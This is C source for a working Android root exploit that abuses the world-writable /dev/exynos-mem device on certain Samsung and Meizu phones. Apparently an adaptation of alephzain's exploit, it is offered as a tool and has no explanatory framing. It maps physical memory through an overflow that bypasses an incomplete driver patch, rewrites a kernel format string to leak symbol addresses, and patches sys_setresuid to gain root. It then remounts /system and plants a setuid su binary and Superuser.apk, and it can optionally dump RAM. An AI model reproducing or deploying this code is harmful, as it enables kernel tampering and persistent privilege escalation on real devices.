/*
 * exynos-mem device abuse by alephzain
 *
 * /dev/exynos-mem is present on GS3/GS2/GN2/MEIZU MX
 *
 * the device is R/W by all users :
 * crw-rw-rw-  1 system graphics  1, 14 Dec 13 20:24 /dev/exynos-mem
 *
 */

/*
 * Abuse it for root shell
 */
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include "util.h"

void hexdump(const void* data, unsigned long size);

#define PAGE_OFFSET 0xC0000000
#define PHYS_OFFSET 0x40000000

int main(int argc, char **argv, char **env) {
	int fd, i, m, index, result;

	unsigned long *paddr = NULL;
    unsigned long kern_offset = (0x40000000UL + 0x1000)/4;
    unsigned long length = (0x7fefffff+1-0x40000000)/4;
    unsigned long *tmp = NULL;
    unsigned long *restore_ptr_fmt = NULL;
    unsigned long *restore_ptr_setresuid = NULL;
    unsigned long addr_sym;

	int page_size = sysconf(_SC_PAGE_SIZE);
    printf("[*] page size is %d\n", page_size);

    /* for root shell */
    char *cmd[2];
    cmd[0] = "/system/bin/sh";
    cmd[1] = NULL;

    /* /proc/kallsyms parsing */
    FILE *kallsyms = NULL;
    char line [512];
    char *ptr;
    char *str;

    bool found = false;

    /* open the door */
	fd = open("/dev/exynos-mem", O_RDWR);
	if (fd == -1) {
		printf("[!] Error opening /dev/exynos-mem\n");
		exit(1);
	}

    /* kernel reside at the start of physical memory, so take some Mb */
    // This mmap fails because the driver is patched to control the maps.
    // However, the patch is incomplete and allows an overflow to bypass the check.
    paddr = (unsigned long *)mmap(NULL, 0x50000000UL, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0xfffff000UL);
    if (paddr == MAP_FAILED) {
        printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
        exit(1);
    }
    printf("[*] mmap success at 0x%lx\n", paddr);

    // wrap around the memory
    tmp = paddr + kern_offset;

    // info("Taking a peek at the target memory 0x%08x...", tmp);
    // hexdump(tmp, 0x1000);

#ifdef DUMP_RAM
    info("Dumping RAM...");
    int fd_dump = open("/data/local/tmp/dump", O_WRONLY|O_CREAT, S_IRWXU);
    if (fd_dump == -1) {
		fatal("Error opening dump file!");
	}

    unsigned char ramBuffer[0x400];
    for (unsigned long *iter = tmp; iter < tmp+length; iter++) {
        memcpy(ramBuffer, tmp, 0x400);
        int ret = write(fd_dump, ramBuffer, 0x400);
        if (ret == -1) {
            fatal("Error dumping file!: %s", strerror(errno));
        }
    }

    fclose(fd_dump);
#endif


    info("Looking for magic bytes...");
    /*
     * search the format string "%pK %c %s\n" in memory
     * and replace "%pK" by "%p" to force display kernel
     * symbols pointer
     */
    for(m = 0; m < length*4; m += 4) {

        if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
            printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
            restore_ptr_fmt = tmp;
            *(unsigned long*)tmp = 0x20207025;
            found = true;
            break;
        }
        tmp++;
    }

    if (found == false) {
        printf("[!] s_show->seq_printf format string not found\n");
        exit(1);
    }

    found = false;

    /* kallsyms now display symbols address */       
    kallsyms = fopen("/proc/kallsyms", "r");
    if (kallsyms == NULL) {
        printf("[!] kallsysms error: %s\n", strerror(errno));
        exit(1);
    }

    /* parse /proc/kallsyms to find sys_setresuid address */
    while((ptr = fgets(line, 512, kallsyms))) {
        str = strtok(ptr, " ");
        addr_sym = strtoul(str, NULL, 16);
        index = 1;
        while(str) {
            str = strtok(NULL, " ");
            index++;
            if (index == 3) {
                if (strncmp("sys_setresuid\n", str, 14) == 0) {
                    printf("[*] sys_setresuid found at 0x%08X\n",addr_sym);
                    found = true;
                }
                break;
            }
        }
        if (found) {
            tmp = paddr + kern_offset;
            tmp += (addr_sym - PAGE_OFFSET) >> 2;
            for(m = 0; m < 128; m += 4) {
                if (*(unsigned long *)tmp == 0xe3500000) {
                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
                    restore_ptr_setresuid = tmp;
                    *(unsigned long *)tmp = 0xe3500001;
                    break;
                }
                tmp++;
            }
            break;
        }
    }

    if (!found) {
        fatal("failed to find sys_setresuid in kallsyms!");
    }

    fclose(kallsyms);

    /* to be sure memory is updated */
    usleep(100000);

    /* ask for root */
    info("asking for root...");
    result = setresuid(0, 0, 0);

    if (result) {
        printf("[!] set user root failed: %s\n", strerror(errno));
        exit(1);
    }

    /* restore memory */
    *(unsigned long *)restore_ptr_fmt = 0x204b7025;
    *(unsigned long *)restore_ptr_setresuid = 0xe3500000;
    munmap(paddr, length);
    close(fd);

    info("remount /system as rw");
    unsigned char *sptr = NULL, *token = NULL, *bufferptr = NULL;
    unsigned char buffer[0x1000];

    FILE *mfd = fopen("/proc/mounts", "r");
    if (mfd == NULL) {
        fatal("failed opening /proc/mounts");
    }

    unsigned char *tokens[6];
    // fgets terminates on EOF or newline
    while (fgets(buffer, sizeof(buffer), mfd)) {
        bufferptr = buffer;
        // char *strtok_r(char *str, const char *delim, char **saveptr);
        for (int i=0; i<6; i++, bufferptr = NULL) {
            tokens[i] = strtok_r(bufferptr, " ", &sptr);
            // info("token: %s", tokens[i]);
        }

        if (strcmp("/system", tokens[1]) == 0) {
            info("/system mount is %s", tokens[0]);
            break;
        }
    }

    int stat_loc;
    int pid = fork();
    char *args[] = {"/system/bin/mount", "-o", "remount,rw", tokens[0], tokens[1], NULL};
    if (pid == 0) {
        info("[c] executing mount");
        execve(args[0], args, NULL);
        exit(0);
    } else if (pid == -1) {
        fatal("Failed to exec /system/bin/mount");
    } else {
        waitpid(pid, &stat_loc, 0);
    }

    info("copy files into /system");
    char *script = "export PATH=/system/bin:/system/xbin:$PATH;cp /data/local/tmp/su /system/xbin/su;chown root:root /system/xbin/su;chmod 6755 /system/xbin/su;ln -s /system/xbin/su /system/bin/su;cp /data/local/tmp/Superuser.apk /system/app/Superuser.apk;chown root:root /system/app/Superuser.apk;chmod 644 /system/app/Superuser.apk;pm install /system/app/Superuser.apk";
    char *args2[] = {"/system/bin/sh", "-c", script, NULL};
    pid = fork();
    if (pid == 0) {
        info("[c] executing sh");
        execve(args2[0], args2, NULL);
        exit(0);
    } else if (pid == -1) {
        fatal("Failed to exec /system/bin/sh");
    } else {
        waitpid(pid, &stat_loc, 0);
    }

    info("all done.");

    /* execute a root shell */
    // info("getting root shell...");
    // execve (cmd[0], cmd, env);

	return 0;
}
